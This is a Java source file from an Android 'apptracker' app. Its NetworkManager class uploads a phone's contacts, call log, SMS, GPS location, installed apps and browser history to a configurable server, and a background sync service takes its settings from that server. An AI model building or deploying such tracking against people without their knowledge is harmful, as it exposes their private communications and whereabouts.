package com.frostweepgames.apptracker.managers;

import android.app.Activity;
import android.content.Context;
import android.util.Log;

import com.frostweepgames.apptracker.Helper;
import com.frostweepgames.apptracker.MainActivity;
import com.frostweepgames.apptracker.data.CheckNetworkConfig;
import com.frostweepgames.apptracker.data.SyncAppSettings;
import com.frostweepgames.apptracker.networking.NetworkPOSTRequest;
import com.frostweepgames.apptracker.networking.responses.CheckResponse;
import com.frostweepgames.apptracker.networking.responses.FailedResponse;
import com.frostweepgames.apptracker.networking.responses.SettingsResponse;
import com.frostweepgames.apptracker.settings.Constants;
import com.frostweepgames.apptracker.settings.Enumerators;
import com.frostweepgames.apptracker.syncservice.SyncBackgroundService;

import java.util.HashMap;

import static android.Manifest.permission.INTERNET;


/**-------------------------------
 * Created by artem on 21.02.2018.
 * Powered by Frostweep Games
 * All rights reserved!
 * (c)2013-2018
 * www.frostweepgames.com
 ---------------------------------*/

public class NetworkManager {

    private MainActivity _mainActivity;
    private Context _currentContext;

    public NetworkManager(Activity activity) {
        _mainActivity = (MainActivity) activity;
        _currentContext = _mainActivity.getApplicationContext();
    }

    public NetworkManager(Context context) {
        _currentContext = context;
    }


    public void sendPOSTRequest(Enumerators.APINetRequestType requestType, Enumerators.NetworkRequestType netRequestType, HashMap<String, Object> data) {

        if (_mainActivity != null) {
            if (!Helper.mayRequestPermission(_mainActivity, INTERNET, Constants.REQUEST_PERMISSION_VALUE)) {
                return;
            }
        }

        if (requestType != Enumerators.APINetRequestType.CHECK)
            data.put(Constants.SERVER_KEY_TOKEN, MainActivity.settingsManager.localAppSettings.serviceToken);

        String routing = MainActivity.settingsManager.localAppSettings.serviceUrl;

        switch (requestType) {
            case UPDATE_CONTACTS:
                routing += Constants.SERVER_SYNC_CONTACTS;
                break;
            case UPDATE_CALLS:
                routing += Constants.SERVER_SYNC_CALLS;
                break;
            case UPDATE_SMS:
                routing += Constants.SERVER_SYNC_SMS;
                break;
            case UPDATE_GPS:
                routing += Constants.SERVER_SYNC_GPS;
                break;
            case UPDATE_INSTALLED_APPS:
                routing += Constants.SERVER_SYNC_INSTALLED_APPS;
                break;
            case UPDATE_BROWSER_HISTORY:
                routing += Constants.SERVER_SYNC_BROWSERS_HISTORY;
                break;
            case GET_SETTINGS:
                routing += Constants.SERVER_HELP_SETTINGS;
                break;
            case SEND_ALARM:
                routing += Constants.SERVER_HELP_ALARM;
                break;
            case SEND_SYSTEM:
                routing += Constants.SERVER_HELP_SYSTEM;
                break;
            case CHECK:
                routing += Constants.SERVER_HELP_CHECK;
                break;
            default:
                break;
        }

        new NetworkPOSTRequest(this, requestType, netRequestType, routing, data);
    }

    public void handleResult(Enumerators.APINetRequestType requestType, String result) {

        if(!isResultIsOkay(result)) {
            try {
                FailedResponse response = Helper.deserializeString(result, FailedResponse.class);
                Helper.drawSystemMessageTooltip(_currentContext, response.data);
            }
            catch (Exception ex){ }
            return;
        }

        switch (requestType) {
            case GET_SETTINGS: {
                MainActivity.settingsManager.syncAppSettings = Helper.deserializeString(result, SettingsResponse.class).data;
                MainActivity.settingsManager.saveSettings();
                Helper.drawSystemMessageTooltip(_currentContext, "Настройки обновлены!");
            }
            break;
            case CHECK: {
                CheckNetworkConfig response = Helper.deserializeString(result, CheckResponse.class).data;

                MainActivity.settingsManager.localAppSettings.serviceToken = response.token;
                MainActivity.settingsManager.localAppSettings.isLogined = true;
                MainActivity.settingsManager.saveSettings();
                MainActivity.settingsManager.loadSyncSettings(false);
                MainActivity.uiManager.showPage(Enumerators.UIPageType.SETTINGS_PAGE);
            }
            break;
            case SYNC_SETTINGS:
                SyncBackgroundService.settingsManager.syncAppSettings = Helper.deserializeString(result, SettingsResponse.class).data;
                SyncBackgroundService.settingsManager.saveSettings();

                SyncBackgroundService.instance.relaunch();
                break;
            default:
                Helper.drawSystemMessageTooltip(_currentContext, result);
                break;
        }
    }

    private boolean isResultIsOkay(String result) {
        if (result.replace('"', '#').contains("#result#:true"))
            return true;

        return false;
    }
}